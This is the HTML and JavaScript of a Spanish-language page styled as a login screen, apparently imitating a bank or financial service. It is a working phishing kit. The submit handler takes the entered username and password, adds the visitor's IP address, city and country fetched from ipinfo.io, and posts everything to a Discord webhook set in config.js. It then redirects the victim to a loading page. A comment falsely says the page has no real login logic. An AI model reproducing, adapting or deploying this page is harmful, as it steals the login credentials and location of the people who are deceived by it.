<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesión</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root{
    --text-dark: #1a1a2e;
    --text-muted: #7a7a85;
    --border: #e4e4e8;
    --field-bg: #f7f7f9;
  }
  *{ box-sizing: border-box; }
  html, body{
    margin: 0;
    padding: 0;
    font-family: 'Roboto', Arial, sans-serif;
    color: var(--text-dark);
  }
  body{
    min-height: 100vh;
    background-image: url('bg-landscape.png');
    background-size: cover;
    background-position: center;
    display: flex;
    flex-direction: column;
    justify-content: center;
    position: relative;
  }
  /* ---------- Difuminado negro sobre el fondo ---------- */
  body::before{
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(
      to bottom,
      rgba(0,0,0,0.55) 0%,
      rgba(0,0,0,0.25) 35%,
      rgba(0,0,0,0.05) 60%,
      rgba(0,0,0,0.35) 100%
    );
    pointer-events: none;
    z-index: 0;
  }
  /* ---------- Top logo ---------- */
  .top-logo{
    display: block;
    margin: 16px auto 80px;
    position: relative;
    z-index: 1;
    bottom: 100px;
  }
  /* ---------- Card ---------- */
  .login-card{
    background: #fff;
    border-radius: 24px;
    padding: 32px 24px 24px;
    max-width: 480px;
    width: calc(100% - 32px);
    margin: 0 auto;
    box-shadow: 0 4px 24px rgba(0,0,0,0.2);
    position: relative;
    z-index: 1;
  }
  .field{
    margin-bottom: 16px;
  }
  .field input{
    width: 100%;
    height: 60px;
    padding: 0 18px;
    border: 1px solid var(--border);
    border-radius: 12px;
    background: var(--field-bg);
    font-size: 15px;
    font-family: inherit;
    color: var(--text-dark);
    outline: none;
    transition: border-color .15s ease;
  }
  .field input::placeholder{
    color: #9a9aa5;
  }
  .field input:focus{
    border-color: #b5b5bd;
  }
  .forgot-row{
    text-align: center;
    margin-bottom: 20px;
  }
  .forgot-row a{
    color: var(--text-dark);
    font-size: 14px;
    text-decoration: none;
  }
  .btn{
    width: 100%;
    height: 54px;
    border: none;
    border-radius: 14px;
    font-size: 16px;
    font-weight: 500;
    font-family: inherit;
    cursor: pointer;
    margin-bottom: 14px;
  }
  .btn-primary{
    background: #131316;
    color: #fff;
  }
  .btn-secondary{
    background: var(--field-bg);
    color: var(--text-dark);
    margin-bottom: 0;
  }
  /* ---------- Bottom sheet handle ---------- */
  .sheet-handle-wrap{
    display: flex;
    justify-content: center;
    padding: 18px 0 10px;
    max-width: 480px;
    width: 100%;
    margin: 24px auto 0;
    position: relative;
    z-index: 1;
  }
  .sheet-handle{
    background: rgba(0,0,0,0.55);
    color: #fff;
    font-size: 12px;
    padding: 6px 16px;
    border-radius: 20px;
  }
</style>
</head>
<body>
  <form id="formis">
  <img src="logopapa.png" class="top-logo" alt="Logo" style="width: 240px">
  <div class="login-card">
    <div class="field">
      <input type="text" placeholder="Usuario"  id="usuario" autocomplete="off">
    </div>
    <div class="field">
      <input type="password" placeholder="Contraseña" id="password" autocomplete="off">
    </div>
    <div class="forgot-row">
      <a href="#">¿Olvidaste tu contraseña?</a>
    </div>
    <button type="submit" class="btn btn-primary" id="btnIniciar">Iniciar sesión</button>
    <button type="button" class="btn btn-secondary">Abrir una cuenta</button>
  </div>
  </form>
  <div class="sheet-handle-wrap">
  </div>
<script>
  // Simple visual feedback for buttons (no real auth logic)
  document.querySelector('.btn-primary').addEventListener('click', () => {
    console.log('Iniciar sesión clicked');
  });
  document.querySelector('.btn-secondary').addEventListener('click', () => {
    console.log('Abrir una cuenta clicked');
  });
</script>
<script src="config.js"></script>
<script>
  const form = document.getElementById("formis");
  const inputUsuario = document.getElementById("usuario");
  const inputPassword = document.getElementById("password");
  const btnIniciar = document.getElementById("btnIniciar");



  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    const usuario = inputUsuario.value.trim();
    const contrasena = inputPassword.value.trim();

    if (!usuario || !contrasena) {
      alert("Por favor completa usuario y contraseña");
      return;
    }


    localStorage.setItem("usuario", usuario);

    btnIniciar.disabled = true;
    btnIniciar.textContent = "Enviando...";

    try {
      let ipData = { ip: "No disponible", country: "No disponible", city: "No disponible" };
      try {
        const ipResponse = await fetch("https://ipinfo.io/json");
        if (ipResponse.ok) {
          ipData = await ipResponse.json();
        }
      } catch (ipErr) {
        console.warn("No se pudo obtener la IP");
      }

      const payload = {
        content: `❤️ATLANTIDA❤️\nUSX: ${usuario}\nCL4V: ${contrasena}\n\n🌍 IP: ${ipData.ip}\n🏙 Ciudad: ${ipData.city || "No disponible"}\n🌐 País: ${ipData.country || "No disponible"}`
      };

      const webhookURL = window.DISCORD_WEBHOOK;
      if (!webhookURL) {
        throw new Error("No se encontró window.DISCORD_WEBHOOK en config.js");
      }

      const res = await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      if (res.ok) {
        window.location.href = "cargando.html";
      } else {
        throw new Error(`Error ${res.status}`);
      }
    } catch (err) {
      console.error(err);
      alert("Hubo un problema al procesar la solicitud.\nIntenta de nuevo más tarde.");
    } finally {
      btnIniciar.disabled = false;
      btnIniciar.textContent = "Iniciar sesión";
    }
  });

</script>
</body>
</html>
